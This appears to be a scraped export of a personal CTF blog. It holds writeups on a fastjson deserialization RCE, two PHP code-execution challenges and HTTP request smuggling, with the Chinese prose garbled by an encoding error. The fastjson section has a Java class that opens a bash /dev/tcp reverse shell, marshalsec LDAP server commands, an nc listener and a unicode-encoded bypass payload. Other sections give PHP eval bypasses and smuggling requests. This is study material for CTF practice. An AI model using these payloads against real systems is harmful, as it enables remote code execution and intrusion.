&lt;id&gt;nexus-aliyun&lt;/id&gt; &lt;name&gt;nexus-aliyun&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/releases&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt; &lt;/repositories&gt;&lt;/project&gt; é‡ç‚¹å…³æ³¨é‡Œé¢å£°æ˜äº†ç‰ˆæœ¬ä¸º1.2.27çš„fastjsonä¾èµ–ï¼Œç½‘ä¸Šæœä¸€ä¸‹åˆ©ç”¨æ–¹å¼ çº¢é˜Ÿæ­¦å™¨åº“:fastjsonå°äº1.2.68å…¨æ¼æ´RCEåˆ©ç”¨exp fastjson-1.2.47-RCE 0x03 fastjsonåˆ©ç”¨å¯¹äºè¿™ä¸ªæ¼æ´ï¼Œå¤§æ¦‚çš„åˆ©ç”¨æ–¹å¼æ˜¯ æˆ‘ä»¬éœ€è¦æœ‰3éƒ¨åˆ† ä¸€ä¸ªä½¿ç”¨fastjsonçš„ç¯å¢ƒï¼ˆä¼ å…¥jsonï¼Œfastjsonå¯¹å…¶è¿›è¡Œè§£æï¼‰ ä¸€ä¸ªRMI/LDAPæœåŠ¡ ä¸€ä¸ªæ¶æ„ç±» æˆ‘ä»¬åˆ©ç”¨åè®®ï¼Œä¾‹å¦‚ldapåè®®ï¼Œå‘ä½¿ç”¨fastjsonçš„ç¯å¢ƒæ³¨å…¥ä¸€ä¸ªldapæœåŠ¡ï¼Œç„¶åæˆ‘ä»¬åœ¨ldapæœåŠ¡ä¸Šè£…è½½ä¸€ä¸ªæ¶æ„ç±»ï¼Œfastjsonä¼šåŠ è½½è¿™ä¸ªç±»å¹¶è¿›è¡Œè§£æ payloadç±»ä¼¼è¿™æ · 1&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;x&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://IP:7777/Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;&#125; ldap://IP:7777/Exploitè¿™é‡Œçš„ipæ˜¯æˆ‘ä»¬å¼€å¯çš„ldapæœåŠ¡æ‰€åœ¨æœåŠ¡å™¨ip ç”±äºè¦å¼€å¯idapæœåŠ¡éœ€è¦æ„å»ºå•¥çš„ï¼Œå¾ˆéº»çƒ¦ï¼Œè¿™é‡Œå°±å¯ä»¥ç”¨åˆ°ä¸€ä¸ªå·¥å…· marshalsec-0.0.3-SNAPSHOT-all.jar ç”¨æ³•ï¼šJava Unmarshaller Security - Turning your data into code execution è¿™ä¸ªå·¥å…·å¯ä»¥å¿«é€Ÿå¼€å¯ä¸€ä¸ªldap/rmiæœåŠ¡ï¼Œè®¿é—®è¿™ä¸ªæœåŠ¡æ—¶å¯ä»¥æŒ‡å®šé‡å®šå‘åˆ°ä¸€ä¸ªhttpæœåŠ¡ï¼Œç°åœ¨æœ‰äº†è¿™ä¸ªå·¥å…·ï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œè¿™æ ·çš„æ“ä½œ 1.å°†æ¶æ„ç±»æ”¾åœ¨ä¸€ä¸ªhttpæœåŠ¡ä¸­ 2.å¼€å¯ä¸€ä¸ªldapæœåŠ¡,è£…è½½httpæœåŠ¡ä¸­çš„æ¶æ„ç±» 3.è®©å—å®³ç¨‹åºä½¿ç”¨fastjsonåŠ è½½æˆ‘ä»¬çš„ldapæœåŠ¡ 0x04 è§£é¢˜ä¸€ä¸ªæ¶æ„ç±»ç¤ºä¾‹ï¼š Exploit.java 123456789101112public class Exploit &#123; public Exploit()&#123; try&#123; Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/port 0&gt;&amp;1&quot;&#125;); //å°†è¿™é‡Œçš„ipå’Œç«¯å£æ›¿æ¢æˆåå¼¹shellçš„ç›®çš„åœ°æœåŠ¡å™¨ipå’Œç«¯å£ &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void main(String[] argv)&#123; Exploit e = new Exploit(); &#125;&#125; å°†è¿™ä¸ªç±»è·Ÿmarshalsec-0.0.3-SNAPSHOT-all.jaræ”¾åœ¨åŒä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹ ä½¿ç”¨javacç”ŸæˆExploit.class javac Exploit.java ç„¶ååœ¨è¿™ä¸ªç›®å½•ä¸‹èµ·ä¸€ä¸ªhttpæœåŠ¡ 1python3 -m http.server 80 å†åˆ©ç”¨å·¥å…·èµ·ä¸€ä¸ªldapæœåŠ¡ 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http:&#x2F;&#x2F;ip:80&#x2F;#Exploit&quot; 1389 åé¢æ—¶httpæœåŠ¡æ‰€åœ¨æœåŠ¡å™¨çš„ipå’Œæˆ‘ä»¬èµ·çš„httpæœåŠ¡çš„ç«¯å£80ï¼Œ#Exploitæ˜¯å·¥å…·ä½¿ç”¨çš„è¯­æ³•ï¼Œè¡¨ç¤ºåœ¨è¿™ä¸ªåœ°å€ä¸‹çš„Exploit.classæ–‡ä»¶ï¼Œçœç•¥åç¼€å†™ä¸Šå»ï¼Œå·¥å…·ä¼šè‡ªåŠ¨è¿›è¡Œæ‹¼æ¥ï¼Œç«¯å£ä¸æŒ‡å®šå°±é»˜è®¤1389 æœ€åå¼€å¯ç›‘å¬ 1nc -lvvp 9999 ç°åœ¨æœ‰ä¸‰ä¸ªæœåŠ¡æ­£åœ¨è·‘ 123456httpæœåŠ¡ï¼šServing HTTP on 0.0.0.0 port 80 (http:&#x2F;&#x2F;0.0.0.0:80&#x2F;) ...ldapæœåŠ¡ï¼šListening on 0.0.0.0:1389ncå‡†å¤‡æ¥æ”¶åå¼¹çš„shellï¼šNcat: Version 7.70 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )Ncat: Listening on :::9999Ncat: Listening on 0.0.0.0:9999 æäº¤payload 1&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;x&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://IP:7777/Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;&#125; å‘ç°å­˜åœ¨è¿‡æ»¤ï¼Œä½†fastjsonæ¯”è¾ƒå¥‡è‘©ï¼Œå…è®¸ä½ ä½¿ç”¨unicodeç¼–ç æˆ–16è¿›åˆ¶ç¼–ç ï¼Œå®ƒä¼šè‡ªåŠ¨ç»™ä½ è§£æï¼Œæ‰€ä»¥ç®€å•é€šè¿‡unicodeç»•è¿‡ 1&#123;&quot;name&quot;:&#123;&quot;\\u0040\\u0074\\u0079\\u0070\\u0065&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c&quot;&#125;,&quot;x&quot;:&#123;&quot;\\u0040\\u0074\\u0079\\u0070\\u0065&quot;:&quot;\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c&quot;,&quot;dataSourceName&quot;:&quot;ldap://ip:port/Exploit&quot;,&quot;\\u0061\\u0075\\u0074\\u006f\\u0043\\u006f\\u006d\\u006d\\u0069\\u0074&quot;:true&#125;&#125;&#125; ip:portæ˜¯ldapæœåŠ¡çš„æœåŠ¡å™¨ipå’Œç«¯å£ å‘é€è¯·æ±‚ånc getshell","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"java web","slug":"CTF/java-web","permalink":"https://123-prog.github.io/categories/CTF/java-web/"}],"tags":[{"name":"sqli","slug":"sqli","permalink":"https://123-prog.github.io/tags/sqli/"},{"name":"java web","slug":"java-web","permalink":"https://123-prog.github.io/tags/java-web/"}]},{"title":"GXYCTF2019 ç¦æ­¢å¥—å¨ƒ","slug":"GXYCTF2019-ç¦æ­¢å¥—å¨ƒ","date":"2021-03-10T12:29:49.000Z","updated":"2021-09-22T10:03:21.060Z","comments":true,"path":"2021/03/10/GXYCTF2019-ç¦æ­¢å¥—å¨ƒ/","link":"","permalink":"https://123-prog.github.io/2021/03/10/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/","excerpt":"0x01.gitæºç æ³„éœ²ï¼Œåˆ©ç”¨å·¥å…·ä¸‹è½½æºç ","text":"0x01.gitæºç æ³„éœ²ï¼Œåˆ©ç”¨å·¥å…·ä¸‹è½½æºç  123456789101112131415161718192021222324&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;;if(isset($_GET[&#x27;exp&#x27;]))&#123; if (!preg_match(&#x27;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123; if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123; if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123; // echo $_GET[&#x27;exp&#x27;]; @eval($_GET[&#x27;exp&#x27;]); &#125; else&#123; die(&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;); &#125; &#125; else&#123; die(&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;); &#125; &#125; else&#123; die(&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;); &#125;&#125;// highlight_file(__FILE__);?&gt; éœ€è¦ç»•ä¸€ä¸‹æ­£åˆ™ï¼Œç¬¬ä¸€ä¸ªæ¡ä»¶é™åˆ¶å„ç§åè®® ç¬¬äºŒä¸ªæ­£åˆ™åŒ¹é…æ›¿æ¢ï¼Œ?Ræ˜¯é€’å½’åŒ¹é…ï¼Œè¡¨ç¤ºå¼•ç”¨è¿™ä¸ªå¼å­ç»§ç»­å¾€é‡Œé¢å¥—å¨ƒï¼Œæœ€ååŒ¹é…çš„åº”è¯¥åƒè¿™æ ·çš„å­—ç¬¦ä¸²xxx(xxx(xx(xxx()))),ä¸èƒ½å­˜åœ¨å‚æ•°ï¼Œæ‰€ä»¥éœ€è¦åˆ©ç”¨æ— å‚æ•°çš„ä»£ç æ‰§è¡Œè¯»å–flag payload highlight_file(next(array_reverse(scandir(pos(localeconv()))))); 12345localeconv()æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œåœ¨è¿™é‡Œä¸»è¦æ˜¯æ‹¿æ¥è·å–ç‚¹å·ï¼Œæœ¬æ¥çš„åŠŸèƒ½æ— å…³ç´§è¦ï¼Œpos()å°±æ˜¯current()åˆ«åï¼Œè·å–æ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œè¿™é‡Œå°±æ˜¯ç‚¹å·scandir()å¾—åˆ°å½“å‰ç›®å½•å†…å®¹ï¼Œå¯ä»¥çœ‹åˆ°flag.phpåœ¨æ•°ç»„çš„å€’æ•°ç¬¬äºŒä¸ªï¼Œè¦è·å–åˆ°flag.phpï¼Œè¿˜å¾—åˆ©ç”¨åˆ°array_reverse()å¯¹æ•°ç»„é€†åºå¤„ç†next()è·å–æ•°ç»„å½“å‰å…ƒç´ çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œåœ¨è¿™é‡Œå°±æ˜¯ç¬¬äºŒä¸ªå…ƒç´ ï¼Œflag.phpæœ€åhighlight_file()æå®š æœ¬æ¥åˆ©ç”¨getcwd()è·å–å½“å‰å·¥ä½œç›®å½•åº”è¯¥ä¹Ÿå¯è¡Œï¼Œä½†å¯æƒœetè¢«ç¬¬ä¸‰ä¸ªæ­£åˆ™è¿‡æ»¤äº†","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"phpä»£ç å®¡è®¡","slug":"CTF/phpä»£ç å®¡è®¡","permalink":"https://123-prog.github.io/categories/CTF/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"phpä»£ç å®¡è®¡","slug":"phpä»£ç å®¡è®¡","permalink":"https://123-prog.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"(RoarCTF 2019) Easy Calc","slug":"RoarCTF-2019-Easy-Calc","date":"2021-03-10T06:46:42.000Z","updated":"2021-09-22T10:03:42.959Z","comments":true,"path":"2021/03/10/RoarCTF-2019-Easy-Calc/","link":"","permalink":"https://123-prog.github.io/2021/03/10/RoarCTF-2019-Easy-Calc/","excerpt":"0x01 phpå˜é‡è§£ææ¼æ´èµ·å› æ˜¯get,postæˆ–å…¶ä»–æ–¹æ³•è·å–æ¥çš„å˜é‡å¦‚æœä¸ç¬¦åˆphpçš„å˜é‡è§„åˆ™ï¼Œphpä¼šå¯¹å…¶è¿›è¡Œé€‚å½“çš„è½¬æ¢ï¼Œæ›´æ”¹ä¸ºç¬¦åˆè§„åˆ™çš„å˜é‡åã€‚ä¸»è¦æ˜¯å°†æŸäº›å­—ç¬¦åˆ é™¤æˆ–è€…æ›¿æ¢æˆä¸‹åˆ’çº¿ã€‚æ¥ä¸‹æ¥çœ‹ä¸€ä¸‹ä¸»è¦æ˜¯å“ªäº›å­—ç¬¦ä¼šå¼•å‘è¿™ä¸ªæ“ä½œ","text":"0x01 phpå˜é‡è§£ææ¼æ´èµ·å› æ˜¯get,postæˆ–å…¶ä»–æ–¹æ³•è·å–æ¥çš„å˜é‡å¦‚æœä¸ç¬¦åˆphpçš„å˜é‡è§„åˆ™ï¼Œphpä¼šå¯¹å…¶è¿›è¡Œé€‚å½“çš„è½¬æ¢ï¼Œæ›´æ”¹ä¸ºç¬¦åˆè§„åˆ™çš„å˜é‡åã€‚ä¸»è¦æ˜¯å°†æŸäº›å­—ç¬¦åˆ é™¤æˆ–è€…æ›¿æ¢æˆä¸‹åˆ’çº¿ã€‚æ¥ä¸‹æ¥çœ‹ä¸€ä¸‹ä¸»è¦æ˜¯å“ªäº›å­—ç¬¦ä¼šå¼•å‘è¿™ä¸ªæ“ä½œ phpçš„å˜é‡è§„åˆ™ï¼š&#39;^[a-zA-Z_\\x80-\\xff][a-zA-Z0-9_\\x80-\\xff]*$&#39;ã€‚è¿™é‡Œçš„\\80-\\xffæ˜¯ASCIIçš„æ‰©å±•ç ï¼Œå…¶ä¸­åŒ…æ‹¬ä¸€äº›æ•°å­¦ç¬¦å·ï¼ŒéŸ³ç¬¦ç­‰ç­‰ï¼Œè¿™é‡Œæ—¢ç„¶è¿™äº›ç¬¦å·æ˜¯ç¬¦åˆphpå˜é‡è§„åˆ™çš„ï¼Œæˆ‘ä»¬å°±ä¸å¿…æµ‹è¯•è¿™äº›æ‰©å±•ç äº†ã€‚ åœ¨phpä¸­parse_str()å‡½æ•°å’Œ $_GETï¼Œ$_POST åœ¨ PHP ä¸­å¡«å……å˜é‡ç›¸ä¼¼ï¼Œä¹Ÿä½¿ç”¨äº†åŒæ ·çš„æœºåˆ¶ï¼Œæ‰€ä»¥æµ‹è¯•ä»£ç ä¸­ä½¿ç”¨è¿™ä¸ªå‡½æ•°æ¥ä»£æ›¿ 123456789101112131415161718192021222324&lt;?php&#x2F;*parse_strä¼šå¯¹æŒ‡å®šçš„å­—ç¬¦ä¸²è¿›è¡Œè§£æå¹¶è½¬åŒ–ä¸ºæœ‰æ•ˆçš„å˜é‡åï¼Œæœ‰äº›éæ³•çš„å˜é‡åå°±ä¼šè¿›è¡Œæ›¿æ¢ï¼Œæ¯”å¦‚æ›¿æ¢æˆä¸‹åˆ’çº¿ï¼Œæˆ–è€…ä¹‹é—´åˆ å»ï¼Œè¿™ä¸ªç¨‹åºæµ‹è¯•å“ªäº›å­—ç¬¦ä¼šè¢«æ›¿æ¢æˆç©ºæˆ–è€…ä¸‹åˆ’çº¿*&#x2F;$test_list &#x3D; [&quot;&#123;&#125;test_val&quot;,&quot;test&#123;&#125;_val&quot;,&quot;test_val&#123;&#125;&quot;];foreach($test_list as $key&#x3D;&gt;$val)&#123; for($i&#x3D;0;$i&lt;127;$i++) &#123; $new_val &#x3D; str_replace(&quot;&#123;&#125;&quot;,chr($i),$val); parse_str($new_val,$output); if(isset($output[&#39;test_val&#39;])) &#123; echo $i.&quot;:&quot;.chr($i).&quot; &#x3D;&gt;&quot;.&quot;åˆ é™¤&quot;.&quot;\\n&quot;; &#125; if(isset($output[&#39;_test_val&#39;])||isset($output[&#39;test__val&#39;])||isset($output[&#39;test_val_&#39;])) &#123; echo $i.&quot;:&quot;.chr($i).&quot; &#x3D;&gt;&quot;.&quot;_\\n&quot;; &#125; &#125; echo &quot;\\n&quot;;&#125;?&gt; ç»“æœæ˜¯: 123456789101112131415161718192032: &#x3D;&gt;åˆ é™¤38:&amp; &#x3D;&gt;åˆ é™¤43:+ &#x3D;&gt;åˆ é™¤46:. &#x3D;&gt;_95:_ &#x3D;&gt;_32: &#x3D;&gt;_43:+ &#x3D;&gt;_46:. &#x3D;&gt;_91:[ &#x3D;&gt;_95:_ &#x3D;&gt;_0: &#x3D;&gt;åˆ é™¤32: &#x3D;&gt;_38:&amp; &#x3D;&gt;åˆ é™¤43:+ &#x3D;&gt;_46:. &#x3D;&gt;_61:&#x3D; &#x3D;&gt;åˆ é™¤91:[ &#x3D;&gt;_95:_ &#x3D;&gt;_ ä¹Ÿå¯ä»¥çœ‹å‡ºåœ¨å˜é‡ä¸­é—´ï¼Œå¼€å¤´ï¼Œç»“å°¾æ’å…¥ä¸ç¬¦åˆè§„åˆ™çš„å­—ç¬¦æ—¶ï¼Œå¤„ç†çš„æ–¹å¼ä¹Ÿä¸ä¸€æ · 0x02é¢˜ç›®å¾ˆç®€å•ï¼Œwafä¹Ÿåªæ˜¯é™åˆ¶äº†å˜é‡ä¸èƒ½ä¸ºå­—ç¬¦ä¸²ï¼Œåˆ©ç”¨ä¸Šé¢çš„è§£ææ¼æ´ï¼Œæˆ‘ä»¬ ä¼ å…¥çš„å˜é‡å¦‚æœæœ‰ä¸€äº›ç‰¹æ®Šçš„ç¬¦å·å°±å¯ä»¥ç»•è¿‡è¿™ä¸ªwaf,å¦‚æœåœ¨ä¹‹åçš„è§£æä¸­ï¼Œè¿™ä¸ªç‰¹æ®Šç¬¦å·è¢«æ›¿æ¢ä¸ºç©ºäº†ï¼Œä¸å°±è¾¾åˆ°ç›®çš„äº† è¿™é‡Œé‡‡ç”¨åœ¨ä¼ å‚çš„æ—¶å€™ç»™å‚æ•°å‰é¢åŠ ä¸ªç©ºæ ¼%20 /calc.php?%20num=sæˆåŠŸä¼ å…¥ /calc.php?%20num=print_r(scandir(chr(47)))æ‰«æ ¹ç›®å½•ï¼Œè¿™é‡Œ/è¢«è¿‡æ»¤ï¼Œåˆ©ç”¨å‡½æ•°ç”Ÿæˆ å‘ç°flagæ–‡ä»¶ï¼Œæ‰“å¼€å¾—åˆ°flag /calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"phpä»£ç å®¡è®¡","slug":"CTF/phpä»£ç å®¡è®¡","permalink":"https://123-prog.github.io/categories/CTF/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"phpå˜é‡è§£æ","slug":"phpå˜é‡è§£æ","permalink":"https://123-prog.github.io/tags/php%E5%8F%98%E9%87%8F%E8%A7%A3%E6%9E%90/"}]},{"title":"Httpè¯·æ±‚èµ°ç§ï¼ˆsmuggling)å­¦ä¹ è®°å½•","slug":"Httpè¯·æ±‚èµ°ç§å­¦ä¹ è®°å½•","date":"2021-02-12T09:29:20.000Z","updated":"2021-07-18T14:18:18.669Z","comments":true,"path":"2021/02/12/Httpè¯·æ±‚èµ°ç§å­¦ä¹ è®°å½•/","link":"","permalink":"https://123-prog.github.io/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","excerpt":"HTTP smuggling è¯·æ±‚å¤¹å¸¦æ”»å‡»ï¼ˆè¯·æ±‚èµ°ç§ï¼‰å­¦ä¹ è®°å½•ç½‘ç«™å¤„ç†ä»ä¸€ä¸ªæˆ–å¤šä¸ªç”¨æˆ·æ¥æ”¶çš„HTTPè¯·æ±‚åºåˆ—æœ‰ä¸€å®šçš„æ–¹å¼ï¼Œåˆ©ç”¨è¯·æ±‚å¤¹å¸¦æŠ€æœ¯ï¼Œæˆ‘ä»¬å¯ä»¥å»å¹²æ‰°ç½‘ç«™å¤„ç†è¯·æ±‚","text":"HTTP smuggling è¯·æ±‚å¤¹å¸¦æ”»å‡»ï¼ˆè¯·æ±‚èµ°ç§ï¼‰å­¦ä¹ è®°å½•ç½‘ç«™å¤„ç†ä»ä¸€ä¸ªæˆ–å¤šä¸ªç”¨æˆ·æ¥æ”¶çš„HTTPè¯·æ±‚åºåˆ—æœ‰ä¸€å®šçš„æ–¹å¼ï¼Œåˆ©ç”¨è¯·æ±‚å¤¹å¸¦æŠ€æœ¯ï¼Œæˆ‘ä»¬å¯ä»¥å»å¹²æ‰°ç½‘ç«™å¤„ç†è¯·æ±‚ å¦‚ä½•äº§ç”Ÿå¦‚ä»Šå¸¸è§çš„webåº”ç”¨ç¨‹åºçš„ä½“ç³»ç»“æ„ï¼Œç”¨æˆ·å‘é€è¯·æ±‚åˆ°æœåŠ¡å™¨ç«¯ï¼Œéœ€è¦å…ˆå°†è¯·æ±‚å‘é€åˆ°å‰ç«¯æœåŠ¡å™¨ï¼Œä¹Ÿå«åå‘ä»£ç†ï¼ˆåŒºåˆ«æ­£å‘ä»£ç†ï¼Œåå‘ä»£ç†ä¼šéšè—å®é™…æœåŠ¡å™¨ç«¯ï¼‰ï¼Œæœ‰æ—¶è¿˜ç§°è´Ÿè½½å¹³è¡¡å™¨ï¼Œ å‰ç«¯æœåŠ¡å™¨ï¼Œå°†HTTPè¯·æ±‚è½¬å‘ç»™åç«¯çœŸå®æœåŠ¡å™¨çš„æ—¶å€™ï¼Œé€šå¸¸å‘åŒä¸€ä¸ªåç«¯ç½‘ç»œè¿ç»­å‘é€å¤šä¸ªè¯·æ±‚ï¼Œè¿™äº›è¯·æ±‚å¯èƒ½æ¥è‡ªä¸åŒçš„ç”¨æˆ·ï¼Œè¿™æ ·åšä¹Ÿæ˜¯ä¸ºäº†æ•ˆç‡ï¼Œå¦‚æœä¸€ä¸ªè¯·æ±‚éœ€è¦ç­‰ç€å¦ä¸€ä¸ªè¯·æ±‚å¤„ç†å®Œæˆæ‰å¯ä»¥å‘é€ï¼Œæ•ˆç‡ååˆ†ä½ä¸‹ æ¥æ”¶çš„æœåŠ¡å™¨ä¼šæ ¹æ®HTTPè¯·æ±‚æ ‡å¤´ç¡®å®šä¸€ä¸ªè¯·æ±‚çš„ç»“æŸå’Œä¸‹ä¸€ä¸ªè¯·æ±‚çš„å¼€å§‹ æ”»å‡»è€…å¯ä»¥åœ¨HTTPè¯·æ±‚ä¸­ç»è¿‡æ„é€ ï¼Œè®©è‡ªå·±æ·»åŠ çš„ä¸œè¥¿ç»è¿‡æœåŠ¡å™¨è§£é‡Šæˆä¸ºä¸‹ä¸€ä¸ªè¯·æ±‚çš„å¼€å§‹ï¼Œé™„åŠ åˆ°ä¸‹ä¸€ä¸ªè¯·æ±‚ï¼ˆå¯èƒ½æ¥è‡ªä»–äººï¼‰ï¼Œé€ æˆè¯·æ±‚å¤¹å¸¦æ”»å‡» å¦‚ä½•æ„é€ HTTPè§„èŒƒæä¾›äº†ä¸¤ç§ä¸åŒçš„æ–¹å¼æ¥æŒ‡å®šè¯·æ±‚çš„ç»“æŸä½ç½® Content-Lengthæ ‡å¤´ Transfer-Encodingæ ‡å¤´ CLæ ‡å¤´ä»¥å­—èŠ‚ä¸ºå•ä½æŒ‡å®šHTTPè¯·æ±‚ä¸­æ¶ˆæ¯çš„é•¿åº¦ 123456POST &#x2F;search HTTP&#x2F;1.1Host: normal-website.comContent-Type: application&#x2F;x-www-form-urlencodedContent-Length:11q&#x3D;smuggling TEæ ‡å¤´æŒ‡å®šæ¶ˆæ¯ä½“ç”¨åˆ†å—ç¼–ç  12345678910POST &#x2F;search HTTP&#x2F;1.1Host: normal-website.comContent-Type: application&#x2F;x-www-form-urlencodedTransfer-Encoding: chunkedbq&#x3D;smuggling0 æ¯ä¸ªå—ä»¥åå…­è¿›åˆ¶æ•°å¼€å§‹ï¼Œè¿™ä¸ªæ•°è¡¨ç¤ºå—çš„å¤§å°ï¼Œå•ä½æ˜¯å­—èŠ‚ï¼Œæ¥ç€æ˜¯å—å†…å®¹ æ¶ˆæ¯ä½“ä»¥å—å¤§å°ä¸º0çš„å—ä½œä¸ºç»“æŸï¼Œ0åé¢æœ‰ä¸¤ä¸ªæ¢è¡Œç¬¦ï¼ˆ/r/n/r/n) å½“å•ä¸ªæ¶ˆæ¯ä¸­åŒæ—¶ä½¿ç”¨è¿™ä¸¤ç§æ–¹æ³•ï¼Œå¦‚æœå‰ç«¯æœåŠ¡å™¨å’Œåç«¯æœåŠ¡å™¨çš„å¤„ç†æ ‡å¤´çš„è¡Œä¸ºä¸åŒï¼Œå°±ä¼šå¯¼è‡´è¯·æ±‚å¤¹å¸¦æ¼æ´ å¦‚ä½•æ‰§è¡ŒHTTPè¯·æ±‚å¤¹å¸¦æ”»å‡»è¯·æ±‚å¤¹å¸¦å°†ä¼šæŠŠCLå¤´å’ŒTEå¤´æ”¾è¿›ä¸€ä¸ªHTTPè¯·æ±‚ä¸­ï¼Œå‰ç«¯æœåŠ¡å™¨å’Œåç«¯æœåŠ¡å™¨ä¼šå¯¹è¿™ä¸¤ä¸ªå¤´è¿›è¡Œå–èˆå¤„ç†ï¼Œå¦‚ä½•å®Œæˆæˆ‘ä»¬çš„å¤¹å¸¦æ”»å‡»ï¼Œéœ€è¦çœ‹è¿™ä¸¤å°æœåŠ¡å™¨çš„å…·ä½“å¤„ç†æ–¹å¼ CL.TEï¼šå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨Content-Lengthå¤´ï¼Œåç«¯æœåŠ¡å™¨ä½¿ç”¨Transfer-Encodingå¤´ã€‚TE.CLï¼šå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨Transfer-Encodingæ ‡å¤´ï¼Œåç«¯æœåŠ¡å™¨ä½¿ç”¨Content-Lengthæ ‡å¤´ã€‚TE.TEï¼šå‰ç«¯å’Œåç«¯æœåŠ¡å™¨éƒ½æ”¯æŒTransfer-Encodingæ ‡å¤´ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡ä»¥æŸç§æ–¹å¼æ¨¡ç³Šæ ‡å¤´æ¥è¯±å¯¼å…¶ä¸­ä¸€ä¸ªæœåŠ¡å™¨ä¸å¤„ç†å®ƒ CL.TE: 12345678POST &#x2F; HTTP&#x2F;1.1Host: vulnerable-website.comContent-Length: 13Transfer-Encoding: chunked0SMUGGLED å‰ç«¯æœåŠ¡å™¨å¤„ç†CLå¤´ï¼Œç¡®å®šæ¶ˆæ¯ä½“é•¿åº¦ä¸º13ï¼Œç›´åˆ°SMUGGLEDç»“æŸåœ¨å‰ç«¯æœåŠ¡å™¨è§£é‡Šä¸‹éƒ½æ˜¯ä¸€ä¸ªè¯·æ±‚ï¼Œä½†åœ¨åç«¯æœåŠ¡å™¨è§£é‡Šï¼Œ0æ˜¯æ¶ˆæ¯ä½“ç»“æŸçš„æ ‡å¿—ï¼Œåé¢çš„SMUGGLEDå°†æˆä¸ºä¸‹ä¸€ä¸ªè¯·æ±‚çš„å¤´éƒ¨ TE.CL: 12345678POST &#x2F; HTTP&#x2F;1.1Host: vulnerable-website.comContent-Length: 3Transfer-Encoding: chunked8SMUGGLED0 è¦ä½¿ç”¨Burp Repeaterå‘é€æ­¤è¯·æ±‚ï¼Œéœ€è¦å…³é—­repeaterçš„è‡ªåŠ¨æ›´æ–°CLå¤´çš„åŠŸèƒ½ï¼Œè¿˜éœ€è¦åœ¨æœ€åçš„0ä¹‹ååŒ…å«å°¾éšåºåˆ—\\r\\n\\r\\n å‰ç«¯æœåŠ¡å™¨å¤„ç†Transfer-Encodingæ ‡å¤´ï¼Œå› æ­¤å°†æ¶ˆæ¯ä½“è§†ä¸ºä½¿ç”¨åˆ†å—ç¼–ç ã€‚å®ƒå¤„ç†ç¬¬ä¸€ä¸ªå—ï¼Œé•¿åº¦ä¸º8ä¸ªå­—èŠ‚ï¼Œç›´åˆ°SMUGGLEDä¹‹åçš„è¡Œçš„å¼€å¤´ã€‚å®ƒå¤„ç†ç¬¬äºŒä¸ªå—ï¼Œå®ƒè¢«ç§°ä¸ºé›¶é•¿åº¦ï¼Œå› 